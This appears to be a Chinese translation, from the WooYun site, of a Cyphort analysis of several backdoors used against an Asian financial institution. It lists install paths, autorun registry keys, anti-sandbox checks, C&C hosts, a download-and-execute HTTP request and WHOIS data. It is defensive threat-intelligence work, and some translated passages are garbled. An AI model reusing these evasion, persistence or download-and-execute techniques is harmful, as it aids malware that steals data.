@@ -1,0 +1,148 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">多种针对某亚洲金融机构的恶意软件分析</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">P3nro5e</a> <span class="bull">·</span> <time title="2015/06/10 10:21" ui-time="" datetime="2015/06/10 10:21" class="published ng-binding ng-isolate-scope">2015/06/10 10:21</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>source：http://www.cyphort.com/multiple-malwares-used-to-target-an-asian-financial-institution/</p><h1>0x00 前言</h1><hr><p>近来, Cyphort Labs已收到多种针对于亚洲某金融机构的恶意软件,由于某进行中的研究,我们将匿名该公司.</p><p>来源已经表明,攻击的起始入口为其中一名雇员打开了某收到的鱼叉式钓鱼邮件,攻击涉及到了多种后门和用于窃取信息的木马。一些恶意软件具有反沙盒属性且含有对抗heuristic signatures（一般被反病毒公司使用）的保护.多种恶意软件样本也展示了某种一般性的主题,例如:将自身安装到<code>%ProgramFiles%</code>或<code>%UserProfile%</code>文件夹（取决于用户是否有admin特权）中.此外,多数的恶意软件样本是用<code>Borland Delphi</code>编译的,它们带有已加密的字符串和API字符串（被混淆或被分为多个字符串）作为保护以对抗heuristic signatures技术.除了某个样本外,其它样本都没被加壳。</p><p>以文件的创建日期为根据,它的出现早于2015年2月,并已持续了三个多月</p><p><img alt="enter image description here" img-src="fe86ee36d25dd62555eee28ae6210d77412af98a.jpg"></p><p>在该攻击中使用的样本概要</p><p>技术分析</p><p><img alt="enter image description here" img-src="3993c89751183eaa4d0ee839d7f4e858fc501a89.jpg"></p><p><img alt="enter image description here" img-src="1961a93434d634bc1179ff9e8d08e56c4ef7a036.jpg"></p><h1>0x01 技术分析</h1><hr><h2>GoogleUpdate.exe</h2><p>今天,流行的恶意软件中，文件的文件结构通常并不像我们看到的那样.为什么？因为在今天,多数AV产品部署了基于启发式的检测技术（检测加壳样本和某些具有非常规文件结构的样本）.该恶意软件没被加壳且区段类似于某正常文件.</p><p>被加密的字符串只在被使用前解密.恶意软件通常将其API字符串分为多个字符串.这也为了躲避heuristic signatures（检测字符串和可疑APIs）.</p><p><img alt="enter image description here" img-src="d47bbaa0edd584e1c168f5f76561c484da041ed0.jpg"></p><p>如果用户有admin特权，则它将其自身副本移动到%Pr0gramFiles%文件夹中.如果不是则不移动 如果具有admin特权:</p><pre><code>%ProgramFilesDir%\Windows NT\Accessories\nt\GoogleUpdate.exe
+</code></pre><p>如果不具有admin特权:</p><pre><code>%UserProfile%\Applications\GoogleUpdate.exe
+</code></pre><p>它作为某种服务（带有”SENSS”服务名）安装自身.</p><p><img alt="enter image description here" img-src="9431b07adfc70300f9512b4d6616dee5b2a4ceca.jpg"></p><p>在检查（它是否成功作为某种服务在运行）之后,检查父进程是否为explorer.exe或iexplore.exe.该dll被加密（通过XOR 0x89作为密钥）</p><p><strong><em>反沙盒</em></strong></p><p>检测Sleep加速功能</p><p>为了挫败沙盒,该恶意软件凭借sleeps或loops拖延恶意软件的执行,因为他知道某沙盒系统将会在限制的短时间内执行恶意软件.</p><p>通过对比,一旦位于你的系统内，恶意软件将有大量时间来实现它的恶意意图。为了挫败该保护，沙盒系统部署了加速功能， 即如果他们检测到某样本使用某种延迟技术，它将加速该样本的执行.例如，如果它检测到该样本sleeps一分钟那么该系统将其改为sleeps 1秒。不幸的是, 对该恶意软件来说，这种技术已经不起作用了.该恶意软件可通过发布某个sleep以检测到sleep的加速，之后在得到消逝时间的同时检查消逝的时间是否比sleep的时间短</p><p><img alt="enter image description here" img-src="f478be1d0689d6903c04cf15bc93506622884732.jpg"></p><p>检测API钩子</p><p>沙盒系统也会钩住APIs以监控某文件操作.该恶意软件通过检查某API的第一条指令是否为jmp,call或一push-retn来检测钩子.它检查某API地址的起始字节是否为如下字节：</p><ul><li>E8</li><li>E9</li><li>EB</li><li>FF</li><li>68????????C3 (push retn)</li></ul><p><img alt="enter image description here" img-src="945912e405e9b7da7116e86827bd1fd4a46a6b0f.jpg"></p><p><strong><em>Payload</em></strong></p><p>被注入的代码是某后门,它被用于与如下C&amp;C服务器通信：</p><pre><code>bbs.gokickes.com:80
+img.lifesolves.com:8080
+domain.gokickes.com:443
+</code></pre><p>取决于后门中的命令，该恶意软件有如下功能：</p><pre><code>下载并执行额外的文件
+</code></pre><p><img alt="enter image description here" img-src="d41879266f50006dbd581bb7079a9b3681d57c3b.jpg"></p><pre><code>捕获屏幕截图
+捕获鼠标和键盘事件记录
+</code></pre><p><img alt="enter image description here" img-src="91a376622ce6ba27858879363dfc5a42be4693a8.jpg"></p><pre><code>更新自身
+打开远程shell
+终止进程
+枚举网络共享
+枚举驱动器
+卸载自身
+最后所有被发送和服务器中接收的数据用0xd5进行异或操作实现加密
+</code></pre><p><img alt="enter image description here" img-src="6ccf151432cdfda056c8252cf3034dbf0f025c34.jpg"></p><h2>mslives.exe</h2><p>该样本与GoogleUpdate.exe有类似的文件结构.但是它没有部署类似的反沙盒功能.</p><p>运行第一次时，在进行它的安装计划前将sleeps300秒。之后，如下所示它创建某自身副本</p><pre><code>%ProgramFiles%\Windows NT\Accessories\Microsoft\mslives.exe
+</code></pre><p>然而，该副本的文件末尾写入了大量垃圾数据，它的大小比自身大小大了100MB。它将对该文件进行1000次的写入100KB操作.为避开沙盒这里做了两件事.首先,该恶意软件不创建自身副本（让该恶意软件的行为不寻常并出现 使该恶意软件行为不寻常并可能因有利操作而出现于沙盒.通常恶意软件操作是为了创建某确切的自身副本。其次,多次写操作事件可能超过沙盒的限制.释放的文件副本的大小让沙盒可信任</p><p><img alt="enter image description here" img-src="0fd0bb39fe86820717f8a5146fc877ff2e577f24.jpg"></p><p>它用CreateProcess执行它的副本接着检查是否作为Iexplore.exe运行，如果不是,它将创建一个被挂起的iexplore.exe进程并将它的代码通过覆盖iexplore.exe的主模块的方式注入其中, 它创建隐藏的windows窗口名和类名“111111”, 然后创建一自启动注册表入口如下（让其在每次机器启动时自动启动）</p><pre><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run 
+  Valuue: msliveupdate
+  Data: %ProgramFilesDir%\Windows NT\Accessories\Microsoft\mslives.exe
+</code></pre><p><strong><em>Payload</em></strong></p><p>该样本只有一个目的，该目的是下载并执行从 <code>forum.energymice.com.</code>中下载的文件</p><pre><code>GET /view/login.asp HTTP/1.1
+Content-Type: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32; 5.1)
+Host: forum.energymice.com
+Cache-Control: no-cache
+</code></pre><p>将下载的文件放入<code>%TEMP%</code>文件夹中并执行它.不幸的是，在我们分析的同时，用于下载的URL没返回任何程序</p><p><img alt="enter image description here" img-src="5f6c436906f3fb7893992f801776440d50dcc53a.jpg"></p><h2>winhost.exe</h2><hr><p>不想其它文件,该文件明显被加壳了.PEID识别壳如下:</p><pre><code>ASProtect 1.2x – 1.3x [Registered] -&gt; Alexey Solodovnikov
+</code></pre><p>该文件是一个命名为”HDOOR”的后门因为我们在其自身发现的该字符串。我们也发现其它有趣的字符串(指明被使用的保护程序)</p><pre><code>HDoor, Version 1.0
+Copyright (C) 2013
+(c) 2010 DYAMAR EnGineerinG, All rights reserved, http://www.dyamar.com.
+</code></pre><p>该后门监听143端口并等待客户端连接和发布命令<code>.143</code>端口是默认的<code>IMAP non-encrypted</code>端口IMAP或（因特网信息通道协议）是邮箱协议的一种（被使用于某本地客户端上访问位于远程web服务器的电子邮箱.</p><p><img alt="enter image description here" img-src="5fd5f7d088db109cfc5033f008a14922801f087f.jpg"></p><p>它检查用户是否有admin特权.如果用户有admin特权,它将作为某服务安装自身并将其副本存放在如下目录:</p><pre><code>%ProgramFiles%\Common Files\System\NT\lib\winhost.exe
+</code></pre><p>如果用户没有admin特权,将如下安装自身并在注册表中构造一个自启动键入口</p><pre><code>%USERPROFILE%\System\winhost.exe
+</code></pre><p>自启动注册表如下:</p><pre><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run 
+  Value: Microsoft Messenger
+  Data: %USERPROFILE%\System\winhost.exe
+</code></pre><p><strong><em>Payload</em></strong></p><p><img alt="enter image description here" img-src="401be9811cfca5e7815c6ccf171e3bc02c61c496.jpg"></p><p>它有能力执行如下操作（取决于攻击者的命令）。</p><ul><li>断开连接</li><li>得到后门的安装路径</li><li>列出文件或目录</li><li>输入某txt文件的内容</li><li>执行某程序</li><li>下载某文件</li><li>得到某CMDShell</li><li>退出某CMDShell</li><li>上传某文件</li><li>下载某个文件</li><li>加载 dll 库</li><li>释放 dll 库</li></ul><h2>nethost.exe</h2><hr><p>安装它自身副本位置取决于用户是否有admin特权：</p><p>如果用户有admin特权：</p><pre><code>%ProgramFiles% \common files\system\library\nethost.exe
+</code></pre><p>作为某种服务安装自身:</p><pre><code>HKLM\System\CurrentControlSet\Services\ncoglsse 
+DisplayName = Microsoft Wireless Device Service
+ImagePath = %ProgramFiles% \common files\system\library\nethost.exe
+</code></pre><p>如果没有admin特权:</p><pre><code>%USERPROFILE% \system\library\nethost.exe
+</code></pre><p>构造如下自启动键</p><pre><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run 
+Value: “ncoglsse”
+Data: %ProgramFiles%\common files\system\library\nethost.exe
+</code></pre><p>在安装之后，它将被注入到lsass.exe以驻存于内存并执行它的payload.</p><pre><code>Payload
+</code></pre><p>从如下URLs中下载</p><pre><code>http://hud321.astringer.com/images/log.gif
+http://grop.waterglue.org/images/logg.gif
+http://hud.astringer.com/images/log.gif
+</code></pre><p>被下载的文件内容是被加密的URLs（用它以连接到其C&amp;C）.恶意软件用HTTP POST连接到该URL并发送如下信息。</p><ul><li>IP 地址</li><li>Language ID</li><li>恶意软件的版本</li><li>操作系统的版本</li><li>机器名</li></ul><p>它从C&amp;C中接收命令且有能力做到如下:</p><pre><code>在你PC上收集关于驱动器和文件夹的信息
+列出文件
+</code></pre><p><img alt="enter image description here" img-src="119676121535bbac7916b0e231ef09803e83a24d.jpg"></p><pre><code>下载文件
+终止文件
+打开 CMD shell
+</code></pre><p><img alt="enter image description here" img-src="da8563c659d398bf4eaee6a2e0c4b88010851aaa.jpg"></p><h2>Shell64.dll</h2><p>Shell64_u.dll-加载器组件 加载器组建被当作某种服务运行,加载组件并确保完全感染.服务，包括服务名（通过恶意软件释放程序来配置,它在编写时是不可知的.字符串被嵌入于加载器组件（促成程序用Dyamar保护程序加壳）,但二进制程序没有留下彻底被保护的痕迹.</p><p>通过宏和大量的混淆字符串促成简明的混淆元素,表明该行为试图让分析变得更复杂但它可轻易被绕过.同时程序也由三部分假输出构成,展示了更多的混淆元素.有趣的是,程序保留一个日志文件,定位于C：\debug.txt，该位置被写入调试信息.</p><p>ServiceMan将直接执行某导出表,或是低于Windows操作系统6.0版本的<code>loadFunc</code>或是6.0及以上版本的<code>win7load</code>.表明导出表加载间谍组件，通过某个弹出的rundll32.exe进程（带有有根据的参数集）.第二个二进制程序导出两个函数,’main‘和’lowmain‘,它再次兼容6.0上下的操作系统版本.</p><p><img alt="enter image description here" img-src="70171b7321e2b67ae481461edd86227fa80c0774.jpg"></p><h2>Shell64.dll –间谍组件</h2><hr><p>该组件由内部名为’Server.dll’模块构成.它导出‘main’ 和‘lowmain函数,main函数服务于6.0及以上的操作系统版本,lowmain服务于6.0以下的操作系统版本.仅像加载器组件那样,该二进制程序创建并持有<code>C:\debug.txt</code>文件(写入被调试的信息)</p><p>在启动shell64.dll期间创建某命名为mutext的文件,称号为<code>Global\KongQi[TickCount]</code>，TickCount的位置实时记录感染次数。同时恶意软件创建某个命名为view的进程，他被使用于在线程和介入的进程间交换运行时信息,称号为’_kaspersky’.选择该称号毫无疑问是为了提高窃取的隐蔽性</p><p><img alt="enter image description here" img-src="9b74a6053786e43e6b0f249baa34867279802e01.jpg"></p><p>在启动恶意软件期间,它获取关于被感染系统的信息并将其发到它的远程服务器。信息包括:</p><pre><code>主机名
+系统cpu电源
+操作系统版本
+Drive geometry for PHYSICALDRIVE0
+全局内存状态
+视频捕获驱动的描述信息
+进程列表中正运行的安全产品
+枚举安全产品
+</code></pre><p>如下列表所示为： 搜索到的安全产品</p><p><img alt="enter image description here" img-src="989ca31a6dc4f1d79f0d55574748ce5d7e49cdc3.jpg"></p><p><img alt="enter image description here" img-src="79ca5f7fa85133b717f04615cf1c672bd7fcb033.jpg"></p><p><img alt="enter image description here" img-src="08c933e95efbe0e88a424b38eec744d7ed784174.jpg"></p><p>如下为被枚举到的防火墙安装情况</p><pre><code>Norton Personal Firewall        
+ZoneAlarm                       
+Comodo Firewall                 
+eTrust EZ Firewall              
+F-Secure Internet Security      
+McAfee Personal Firewall        
+Outpost Personal Firewall       
+Panda Internet Seciruty Suite   
+Panda Anti-Virus/Firewall       
+BitDefnder/Bull Guard Antivirus
+Rising Firewall                 
+360Safe AntiArp
+</code></pre><h2>间谍功能</h2><hr><p>一旦恶意软件完成部署,则等待接收来自远程服务器的指令.它的功能相当多,且被设计来在被感染系统中窃取数据.用<code>deflare</code>算法压缩被窃取的信息并将其发送到某远程服务器.如下为分析出的函数列表:</p><ul><li>Video Captures使用某命名为CVideoCap的捕获窗口,压缩视频时使用Windows VCM API(视频压缩管理器)</li><li>从系统的声音输入设备中捕获信息,如麦克风</li><li>从当前桌面的粘贴板窃取数据,他可从密码管理器中提取密码</li><li>捕获截图并压缩它们,作为某数据流潜逃</li><li>样本含有某用户态键盘记录器,通过SetWindowsHookEx设置全局windows钩子以监听键盘事件,它通过Windows IMM API（Input Method Manager）解析;键击记录被转储到某’jpjl.dat’文件中</li><li>清理事件日志（’应用‘，’安全‘，’系统‘）,一般是为了擦除某次入侵的取证证据.</li><li>关闭系统,意外强制重启</li><li>创建某本地用户名的描述‘This user account is used by the Visual Studio .NET Debugger’</li><li>下载文件并执行它们</li><li>执行硬盘中其他的二进制程序</li><li>在系统上枚举文件和文件属性，修改并删除文件和目录</li><li>枚举已打开程序的窗口名</li><li>枚举系统属性如操作系统版本,cpu电源或硬盘的内存容量,系统运行时间,处理器数,机器上运行中的安全产品的进程名,计算机名,当前用户的用户名,已附加的驱动器.</li></ul><p><img alt="enter image description here" img-src="50719d903642a93b941b0d4e02f4204695414868.jpg"></p><ul><li>枚举dial-up连接参数,例如电话号码和设备名</li><li>开启终端服务并允许远程连接</li><li>弹出消息窗口</li><li>开启某socket来发送并接收数据</li></ul><p>删除它的文件并持续机器中的某机制,等等.卸载服务并移除某自启动注册表(位于<code>[HKLM]\..\CurrentVersion\Run named ‘MSLiveMessenger’</code> )；这是不易理解的想法,创建该键的方法可从如下链接中了解到: http://www.cyphort.com/multiple-malwares-used-to-target-an-asian-financial-institution/#sthash.O2q4UOUI.dpuf</p><p><strong><em>持续性手段</em></strong></p><p>设计二进制程序以在Windows服务的上下文内运行,假定通过某释放程序搭建.服务名也不明确,因为它是由释放程序设置的.然而,恶意软件的功能有: 将其payload注入到远程进程并含有注入到winlogon.exe的函数（在Windows6.0之前的版本中）</p><pre><code>dllhost.exe
+</code></pre><p>该恶意软件不会做更多事.它仅试图从<code>blog.softfix.co.kr:80</code>下载东西</p><p><img alt="enter image description here" img-src="130d43b9e5ae7e369a8977c01cbd4344cdc07413.jpg"></p><h1>0x02 幕后是谁？</h1><hr><p>使用C&amp;C服务器的攻击者在韩国注册的注册记录看起来是伪造的.多数C&amp;C服务器也拥有hugedomains.com,该公司之前售卖拥有的域名和隐藏信息服务.我们也可以意识到字符串位于二进制程序中,它显然不是来自本地的</p><p>C&amp;C使用的whois记录如下</p><p>bbs.gokickes.com:80, domain.gokickes.com:443 (GoogleUpdate.exe)</p><pre><code>Emails <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2ae88ae88ae88ae88a4e454e45474544416a474b434604494547">[email&#160;protected]</a> (a, t, r)
+Names smith jack (a, t, r)
+Organizations     
+Streets seoul, korea (a, t, r)
+Cities seoul (a, t, r)
+States seoul (a, t, r)
+Postals 158070 (a, t, r)
+Countries KR (a, t, r)
+Phones 8245896312 (a, t, r)
+</code></pre><p>img.lifesolves.com:8080 (GoogleUpdate.exe)</p><pre><code>Emails <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e725472547254725478d8e8a8c8e8a93828289a78a868e8bc984888a">[email&#160;protected]</a> (a, t, r)
+Names zhang yunqiang (a, t, r)
+Organizations     
+Streets Taiping Road (a, t, r)
+Cities seoul (a, t, r)
+States seoul (a, t, r)
+Postals 100-744 (a, t, r)
+Countries KR (a, t, r)
+Phones 82527656289 (a, t, r)
+</code></pre><p>softfix.co.kr (dllhost.exe)</p><pre><code>Registrant                  : gson
+Administrative Contact(AC)  : zhang yunqiang
+AC E-Mail                   : <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a8c2c1c5c3c1c5dccdcdc6e8c5c9c1c486cbc7c5">[email&#160;protected]</a>
+Registered Date             : 2014. 01. 08.
+Last Updated Date           : 2014. 01. 08.
+Expiration Date             : 2016. 01. 08.
+Publishes                   : N
+Authorized Agency           : Gabia, Inc.(http://www.gabia.co.kr)
+DNSSEC                      : unsigned
+</code></pre><p>diskoco.com (mpsvc.exe)</p><pre><code>Registrant Name:yang qi
+Registrant Organization:yang qi
+Registrant Street:Guancheng District No126
+Registrant City:dong guan
+Registrant State/Province:Guangdong
+Registrant Postal Code:523000
+Registrant Country:China
+Registrant Phone:+86.0769 89098138
+Registrant Phone Ext:
+Registrant Fax:+86.0769 89098200
+Registrant Fax Ext:
+Registrant Email:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7e0d11180a131111103e131f1712501d1113">[email&#160;protected]</a>
+</code></pre><p>forum.energymice.com (mslives.exe)</p><pre><code>Registrant Name: Domain Admin
+Registrant Organization: HugeDomains.com
+Registrant Street: 2635 Walnut Street
+Registrant City: Denver
+Registrant State/Province: CO
+Registrant Postal Code: 80205
+Registrant Country: US
+Registrant Phone: +1.303.893.0552
+Registrant Phone Ext:
+Registrant Fax:
+Registrant Fax Ext:
+Registrant Email: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8eeae1e3efe7e0fdcee6fbe9ebeae1e3efe7e0fda0ede1e3">[email&#160;protected]</a>
+</code></pre><p>astringer.com (nethost.exe)</p><pre><code>Registrant Name: Domain Admin / This Domain is For Sale
+Registrant Organization: HugeDomains.com
+Registrant Street: 2635 Walnut Street
+Registrant City: Denver
+Registrant State/Province: CO
+Registrant Postal Code: 80205
+Registrant Country: US
+Registrant Phone: +1.303.893.0552
+Registrant Phone Ext:
+Registrant Fax:
+Registrant Fax Ext:
+Registrant Email: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b4d0dbd9d5dddac7f4dcc1d3d1d0dbd9d5dddac79ad7dbd9">[email&#160;protected]</a>
+</code></pre><p>waterglue.org</p><pre><code>Registrant Name:Registration Private
+Registrant Organization:Domains By Proxy, LLC
+Registrant Street: DomainsByProxy.com
+Registrant Street: 14747 N Northsight Blvd Suite 111, PMB 309
+Registrant City:Scottsdale
+Registrant State/Province:Arizona
+Registrant Postal Code:85260
+Registrant Country:US
+Registrant Phone:+1.4806242599
+Registrant Phone Ext:
+Registrant Fax: +1.4806242598
+Registrant Fax Ext:
+Registrant Email:<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c79086938295808b9282e988958087a3a8aaa6aea9b4a5beb7b5a8bfbee9a4a8aa">[email&#160;protected]</a>
+</code></pre><h1>0x03 结论</h1><hr><p><strong><em>恶意软件无需变得高级</em></strong></p><p>这些恶意软件不高级,同时它们是恶意软件的家族成员,我们在之前看到它们也能绕过安全检测.恶意软件驻存了长达三个月的时间（给予攻击者充分的时间进行操作）.这证明了恶意软件不必高级也能完成任务</p><p>使用AV仍是我们最好的防御手段,他们隔离主要的安全事件,因为有太多恶意软件的攻击者用多种不同的技术（没有单一安全解决方案停止这些攻击）.这是我们需要多种安全解决方案的原因,同时，在我们各自的群体中,我们也需要保护人们的安全.</p><p><strong><em>为何进行鱼叉式钓鱼？</em></strong></p><p>恶意软件的初始入口是某次鱼叉式钓鱼（针对前面提到的公司）.根据TrendMicro 中的报告,鱼叉式攻击仍然是最常见的APT攻击手段.报告中表明：“APT活动频繁使用鱼叉式钓鱼手段,本质是让高级阶层的目标打开钓鱼电子邮件从而拿下目标.</p><p>对于攻击者来说,猜测某组织中的邮箱地址尤其简单,如果目标是高级阶层的官员（由于在线可看到他们的名字）.攻击者可通过在线搜索信息而轻易拿下他们的资料.这使攻击者可根据目标的资料自定义他们的攻击行为</p><p>这是一则保护我们组织的消息,我们也必须教育并培训所有在我们组织中的人们（进行安全实战),以免遭受这些类型的社会工程学攻击威胁.</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/6711" rel="bookmark" id="re1">linux ddos恶意软件分析</a></li><li><a href="http://drops.wooyun.org/tips/2562" rel="bookmark" id="re2">一起针对国内企业OA系统精心策划的大规模钓鱼攻击事件</a></li><li><a href="http://drops.wooyun.org/pentesting/2125" rel="bookmark" id="re3">使用LDAP查询快速提升域权限</a></li><li><a href="http://drops.wooyun.org/tools/950" rel="bookmark" id="re4">迭代暴力破解域名工具</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌帽子</span> <span class="reply-time">2015-06-12 14:08:36</span></div><p></p><p>@imlonghao email Protect 哈哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-06-10 16:19:55</span></div><p></p><p>怎么看都像中国人的马。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">imlonghao</span> <span class="reply-time">2015-06-10 13:44:18</span></div><p></p><p>谜一样的：<br>/* &lt;![CDATA[ */!function(){try{var t=&quot;currentScript&quot;in document?document.currentScript:function(){for(var t=document.getElementsByTagName(&quot;script&quot;),e=t.length;e--;)if(t[e].getAttribute(&quot;cf-hash&quot;))return t[e]}();if(t&amp;&amp;t.previousSibling){var e,r,n,i,c=t.previousSibling,a=c.getAttribute(&quot;data-cfemail&quot;);if(a){for(e=&quot;&quot;,r=parseInt(a.substr(0,2),16),n=2;a.length-n;n+=2)i=parseInt(a.substr(n,2),16)^r,e+=String.fromCharCode(i);e=document.createTextNode(e),c.parentNode.replaceChild(e,c)}}}catch(u){}}();/* ]]&gt; */</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Samsong</span> <span class="reply-time">2015-06-10 11:51:29</span></div><p></p><p>翻译的有点奇怪啊，加油</p><p></p></div></div></div></div></div></main>
